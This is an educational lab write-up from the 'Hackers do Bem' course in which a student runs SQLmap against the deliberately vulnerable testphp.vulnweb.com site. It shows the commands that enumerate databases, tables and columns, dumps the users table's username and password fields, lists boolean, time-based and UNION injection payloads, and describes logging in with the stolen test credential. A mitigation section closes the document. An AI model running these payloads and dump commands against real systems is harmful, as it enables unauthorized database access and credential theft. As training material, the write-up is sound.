# Activity 6.10 — Exploring SQL Injection on Kali Linux with SQLmap

> **Program:** Hackers do Bem  
> **Stage:** Fundamental — Module 06  
> **Class:** 23–24  
> **Environment:** Kali Linux  
> **Status:** Completed

## Objective

This activity used SQLmap on Kali Linux to analyze a web application specifically provided for security testing and demonstrate how an SQL Injection vulnerability works.

Using a GET parameter from the application, the following information was identified:

- The DBMS used by the application.
- The SQL Injection techniques supported by the parameter.
- The available databases.
- The tables in the `acuart` database.
- The columns in those tables.
- Data from a column in the `users` table.
- A test credential that, in the laboratory, allowed authentication to the vulnerable application itself.

The activity was performed against the `testphp.vulnweb.com` training environment, which is provided for security testing. The credentials used to access the laboratory are not recorded in this document.

## Environment

- **Operating system:** Kali Linux
- **Access method:** RDP
- **Machine IP address:** `192.168.98.40`
- **User:** `aluno`
- **Tool:** SQLmap
- **Laboratory target:** `http://testphp.vulnweb.com`
- **Parameter analyzed:** `artist`

## 1. Identify the Test Application

In Firefox, a search was performed to locate a page in the training environment that used an `id` parameter:

```text
site:http://testphp.vulnweb.com/ php?id=
```

The first result led to:

```text
http://testphp.vulnweb.com
```

On the website, **Browse artists** was selected, followed by the first artist identified as `r4w8173`.

The resulting page had the following structure:

```text
http://testphp.vulnweb.com/artists.php?artist=1
```

The parameter:

```text
artist=1
```

was used by SQLmap to check for a possible SQL Injection vulnerability.

## 2. Obtain Administrative Privileges on Kali Linux

The following command was used in the terminal:

```bash
sudo -i
```

The password used in the laboratory has been omitted from this document.

## 3. Identify Databases with SQLmap

The first test used the `artist` parameter to identify potential injection points and enumerate databases:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
```

SQLmap began testing the `artist` GET parameter.

The findings included:

```text
[INFO] testing if GET parameter 'artist' is dynamic
[INFO] GET parameter 'artist' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
```

SQLmap identified MySQL as the likely backend DBMS and proceeded to test different SQL Injection techniques.

### Techniques Tested

The analysis included tests for:

- Boolean-based Blind
- Error-based
- Parameter Replace
- Stacked Queries
- Time-based Blind
- UNION Query

SQLmap identified the `artist` parameter as vulnerable.

**Relevant output:**

```text
Parameter: artist (GET)
   Type: boolean-based blind
   Title: AND boolean-based blind - WHERE or HAVING clause
   Payload: artist=1 AND 5066=5066

   Type: time-based blind
   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
   Payload: artist=1 AND (SELECT 6951 FROM (SELECT(SLEEP(5)))OcNh)

   Type: UNION query
   Title: Generic UNION query (NULL) - 1 to 20 columns
   Payload: artist=-9154 UNION ALL SELECT CONCAT(0x7162767a71,0x614d4c77757359426e45586b645243546a4e486c6161786b455549636c4a7649707a6e506261596d,0x716b787171),NULL,NULL-- -
```

SQLmap also identified the following environment details:

```text
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.0.12
```

### Databases Found

The result was:

```text
available databases [2]:
[*] acuart
[*] information_schema
```

SQLmap therefore enumerated two databases:

- `acuart`
- `information_schema`

## 4. Enumerate Tables in the `acuart` Database

After identifying the database, the following command was executed:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
```

SQLmap returned:

```text
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+
```

Eight tables were identified:

```text
artists
carts
categ
featured
guestbook
pictures
products
users
```

The `users` table was of particular interest because it could contain sensitive application data.

## 5. Enumerate the Columns

To retrieve the structure of the tables in the `acuart` database, the following command was used:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --columns
```

SQLmap identified the following table structures.

### `artists` Table

```text
Database: acuart
Table: artists
[3 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| adesc     | text        |
| aname     | varchar(50) |
| artist_id | int         |
+-----------+-------------+
```

### `featured` Table

```text
Database: acuart
Table: featured
[2 columns]
+--------------+------+
| Column       | Type |
+--------------+------+
| feature_text | text |
| pic_id       | int  |
+--------------+------+
```

### `categ` Table

```text
Database: acuart
Table: categ
[3 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| cat_id | int         |
| cdesc  | tinytext    |
| cname  | varchar(50) |
+--------+-------------+
```

### `pictures` Table

```text
Database: acuart
Table: pictures
[8 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| a_id   | int          |
| cat_id | int          |
| img    | varchar(50)  |
| pic_id | int          |
| plong  | text         |
| price  | int          |
| pshort | mediumtext   |
| title  | varchar(100) |
+--------+--------------+
```

### `guestbook` Table

```text
Database: acuart
Table: guestbook
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| mesaj    | text         |
| sender   | varchar(150) |
| senttime | int          |
+----------+--------------+
```

### `carts` Table

```text
Database: acuart
Table: carts
[3 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| cart_id | varchar(100) |
| item    | int          |
| price   | int          |
+---------+--------------+
```

### `products` Table

```text
Database: acuart
Table: products
[5 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| description | text         |
| name        | text         |
| id          | int unsigned |
| price       | int unsigned |
| rewritename  | text         |
+-------------+--------------+
```

### `users` Table

```text
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| name    | varchar(100) |
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+
```

The `users` table contains fields related to authentication and personal information, such as:

```text
uname
pass
email
phone
address
```

The `cc` field, associated with card information, was also identified.

In a real application, exposing this data through SQL Injection would represent a significant security risk.

## 6. Retrieve Data from the `users` Table

After identifying the table structure, a test targeting the `uname` column was performed:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump
```

The result contained one entry:

```text
Database: acuart
Table: users
[1 entry]
+-------+
| uname |
+-------+
| test  |
+-------+
```

SQLmap also reported that the data was saved locally to:

```text
/root/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv
```

The retrieved value corresponds to a test account in the vulnerable environment.

## 7. Retrieve the Laboratory Password Field

Next, the following command was executed:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump
```

SQLmap returned an entry for the `pass` column.

Because this is an authentication credential, the actual value is not reproduced in this README.

The result confirmed that the training environment stored the test account's credential in a form that could be retrieved directly through the vulnerability.

## 8. Test Authentication

Using the data retrieved in the previous steps, the following page was accessed again:

```text
http://testphp.vulnweb.com/artists.php?artist=1
```

On the application, the **Signup** option in the left-hand column was selected.

The test credentials obtained during enumeration were entered, and an authentication attempt was made.

The login was accepted by the training environment, demonstrating the potential impact of SQL Injection when it exposes information stored in a database.

This is the step specified for the activity evidence.

## SQL Injection Techniques Observed

### Boolean-Based Blind

SQLmap identified a technique based on Boolean conditions.

Example identified:

```sql
artist=1 AND 5066=5066
```

This technique can infer information by observing differences in the application's responses when true or false conditions are supplied.

### Time-Based Blind

A time-based technique was also identified:

```sql
artist=1 AND (SELECT 6951 FROM (SELECT(SLEEP(5)))OcNh)
```

In this type of test, controlled response delays can be used to infer whether a condition was processed by the database.

### UNION Query

SQLmap identified a UNION-based technique and reported that it could test different column counts:

```text
Generic UNION query (NULL) - 1 to 20 columns
```

This technique can allow results from additional queries to be combined with the original query when an application is vulnerable.

### Error-Based

Tests were also performed to examine whether database error responses could expose information about query processing.

### Stacked Queries

SQLmap tested whether stacked queries were possible. Under certain conditions, stacked queries allow multiple SQL statements to be processed in a single request.

## What Was Identified

The enumeration process demonstrated a typical SQL Injection analysis workflow:

```text
GET Parameter
     ↓
SQL Injection Detection
     ↓
DBMS Identification
     ↓
Database Enumeration
     ↓
Table Enumeration
     ↓
Column Enumeration
     ↓
Data Extraction
     ↓
Impact Assessment in the Application
```

In this laboratory, the following parameter was identified as vulnerable:

```text
artist
```

The backend was identified as MySQL, and the `acuart` database contained a `users` table with authentication-related fields.

## Security Concepts

### SQL Injection

SQL Injection occurs when user-controlled data is incorporated unsafely into SQL queries.

When appropriate validation and parameterization are absent, an attacker may manipulate the original query and cause the database to perform operations that were not intended by the application.

### Potential Impact

Depending on the context, this type of vulnerability may allow:

- Discovery of database structures.
- Unauthorized reading of information.
- Modification of data.
- Exposure of authentication information.
- Account compromise.
- Additional impacts on the application or infrastructure in certain scenarios.

### Mitigation Measures

Key defensive measures include:

- Using prepared statements and parameterized queries.
- Avoiding direct concatenation of user input into SQL statements.
- Applying input validation where appropriate.
- Using database accounts with the minimum privileges required.
- Protecting sensitive stored information.
- Storing passwords using appropriate modern password-hashing algorithms.
- Monitoring anomalous requests and application access attempts.
- Performing security testing regularly.

## Results

The activity demonstrated, in a dedicated testing environment, how SQLmap can automate the identification and controlled testing of an SQL Injection vulnerability.

The `artist` parameter was identified as vulnerable, and SQLmap was able to:

- Detect a potential SQL Injection vulnerability.
- Identify MySQL as the backend DBMS.
- Identify the `acuart` database.
- Enumerate eight tables.
- Enumerate the columns in those tables.
- Identify the `users` table.
- Retrieve data from a test account.
- Demonstrate the vulnerability's impact through authentication in the training environment.

The activity highlighted how a single vulnerable parameter can expose database structure and sensitive data, potentially affecting account security.

## Evidence

The evidence for this activity corresponds to **Step 11**, in which the test credentials retrieved during the activity were used to authenticate to the vulnerable training environment.

[View Evidence — Classes 23–24](../evidencias.pdf)

---

[Back to Classes 23–24](../) · [Back to Module 06](../../README.md) · [Back to Fundamental](../../../README.md) · [Back to Hackers do Bem](../../../../README.md)
